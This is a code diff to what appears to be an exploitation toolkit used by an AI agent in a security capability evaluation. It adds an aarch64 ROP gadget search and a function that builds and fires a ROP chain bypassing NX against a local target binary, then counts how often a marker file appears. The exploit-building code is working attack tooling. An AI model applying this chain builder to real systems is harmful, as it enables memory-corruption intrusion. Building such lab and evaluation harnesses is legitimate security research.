@@ -188,25 +188,61 @@ def op_symbol(a):
     return {"name": name, "addr": e.symbols[name], "addr_hex": hex(e.symbols[name])}
 
 def op_gadgets(a):
-    # NOTE: broken on aarch64 in this image — pwntools' bundled ROPgadget references
-    # capstone's CS_ARCH_ARM64, which capstone 6.0 renamed to CS_ARCH_AARCH64, so
-    # ROP() raises NameError. Degrade gracefully with a clear message rather than
-    # throwing at the agent. The NX/ROP ramp rung is deferred until this is fixed
-    # (pin a compatible capstone/ROPgadget, or use ropper).
-    e = ELF(BIN, checksec=False)
+    # Gadget search via the ROPgadget CLI (works on aarch64 after the image's
+    # capstone/ROPgadget compat fix). Filter by a substring query, e.g. "x0, x30"
+    # to find the argument-loading chaining gadget for a call chain.
+    q = (a.get("query") or "").strip().lower()
     try:
-        rop = ROP(e)
+        out = subprocess.run(["ROPgadget", "--binary", BIN],
+                             capture_output=True, text=True, timeout=90).stdout
     except Exception as ex:
-        return {"gadgets": {}, "error": f"gadget search unavailable on {e.arch}: {type(ex).__name__}: {ex}",
-                "note": "aarch64 ROP tooling (capstone/ROPgadget) needs an image fix; NX/ROP rung deferred"}
-    found = {}
-    for g in ("ret", "pop rdi", "pop rsi", "pop rax", "syscall"):
+        return {"gadgets": [], "error": f"{type(ex).__name__}: {ex}"}
+    gadgets = []
+    for line in out.splitlines():
+        line = line.strip()
+        if not line.startswith("0x") or " : " not in line:
+            continue
+        addr, insns = line.split(" : ", 1)
+        if q and q not in insns.lower():
+            continue
+        gadgets.append({"addr": addr, "addr_int": int(addr, 16), "insns": insns})
+    return {"count": len(gadgets), "gadgets": gadgets[:40]}
+
+def _as_int(v):
+    return int(v, 0) if isinstance(v, str) else int(v)
+
+def op_build_rop_call(a):
+    # ROP chain to call func(arg) despite NX. Chain layout matches the target's
+    # loader gadget "ldp x0, x30, [sp], #16 ; ret": <offset> filler + gadget +
+    # arg (-> x0) + func (-> called with x0=arg). Fires N times.
+    off = _as_int(a["offset"]); gadget = _as_int(a["gadget_addr"]); arg = _as_int(a["arg"])
+    times = int(a.get("times", 5)); marker_env = a.get("marker", "")
+    func_name = a.get("func", "unlock")
+    func = ELF(BIN, checksec=False).symbols.get(func_name)
+    if func is None:
+        return {"error": f"no symbol {func_name}"}
+    fires, results = 0, []
+    for _ in range(times):
+        try: os.remove("/tmp/objective_marker")
+        except FileNotFoundError: pass
+        env = dict(os.environ)
+        if marker_env: env["AEGIS_MARKER"] = marker_env
+        io = process([BIN], env=env)
         try:
-            addr = rop.find_gadget(g.split())
-            if addr: found[g] = hex(addr[0] if hasattr(addr, "__getitem__") else addr.address)
+            payload = (b"A" * off + gadget.to_bytes(8, "little")
+                       + (arg & 0xffffffffffffffff).to_bytes(8, "little") + func.to_bytes(8, "little"))
+            io.send(payload)
+            rc = io.wait(timeout=5)
         except Exception:
-            pass
-    return {"gadgets": found}
+            rc = None
+        finally:
+            try: io.close()
+            except Exception: pass
+        fired = os.path.exists("/tmp/objective_marker")
+        fires += 1 if fired else 0
+        results.append({"exit": rc, "marker_fired": fired})
+    return {"times": times, "fires": fires, "reliability": fires / times if times else 0,
+            "chain": {"offset": off, "gadget": hex(gadget), "arg": hex(arg), "func": func_name}, "results": results}
 
 
 def op_exploit(a):
